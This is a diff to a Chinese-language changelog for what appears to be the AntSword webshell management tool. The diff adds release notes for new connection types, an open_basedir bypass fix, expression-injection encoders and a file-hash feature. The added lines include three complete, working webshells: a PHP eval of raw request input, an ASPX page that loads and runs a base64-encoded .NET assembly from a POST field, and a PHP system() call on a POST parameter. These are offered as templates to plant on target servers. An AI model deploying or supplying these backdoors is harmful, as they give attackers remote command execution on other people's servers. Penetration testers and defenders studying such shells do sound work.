@@ -7,18 +7,61 @@
 ### 核心
 
 * 修复 PHP/PHP4 当前目录不可写时 bypass open_basedir 失败的 Bug
-* 新增 PHPRAW 类型, 该类型 webshell 支持的 WebShell 类似如下代码:
+* 新增 PHPRAW 类型, 该类型支持的 WebShell 类似如下代码:
 
 ```php
-<?php eval(file_get_contents("php://input"));>
+<?php eval(file_get_contents("php://input"));?>
 ```
 
-> 为了方便直连 Behinder3 WebShell, 编码器已内置
+> 为了方便直连 Behinder3 WebShell, 编码器已内置。
+
+* 新增 ASPXCSharp 类型
+
+该类型支持的 WebShell 类似如下代码:
+
+```
+<%@ Page Language="c#"%>
+<%
+  String Payload = Request.Form["ant"];
+  if (Payload != null)
+  {
+    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(null);
+  }
+%>
+```
+
+有关该类型的设计说明, 请参考[聊聊新类型ASPXCSharp](https://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/)
+
+* 新增 PSWindows 类型，与 CMDLinux 类似
+
+> 基于命令执行的一句话类型, 仅支持 Windows 环境
+
+该类型支持的 WebShell 类似如下代码:
+
+```php
+<?php system($_POST["ant"]);?>
+```
+
+有关 PSWindows 的一些注意事项和原理说明, 请参考[新类型 PSWindows 预览](https://mp.weixin.qq.com/s/tPPg4VgQH-n2O3Lnfg8lVA)
+
+* JSPJS 兼容各种表达式注入
+
+> 具体请看 spelbase64、el、ognl 这三个内置编码器样例
+
 
 ### 数据管理
 
 * 优化了编辑 Shell 信息时，URL后缀发生改变后连动修改「连接类型」功能
 * 优化插件快捷设置,修正过多快捷设置后对UI影响(Fix #303)
+* 修复 JSP/MySQL类型在表名中有特殊字符时执行异常的 Bug (thx @powersploit)
+
+### 文件管理
+
+* 新增 FileHash 计算目标文件 hash 功能
+
+> 该功能目前正在逐步适配所有类型中 (PHP/PHP4/PSWindows/CMDLinux/JSP)
+
 ### 后端模块
 
 * 支持自定义 Content-Type, 默认是 `form`
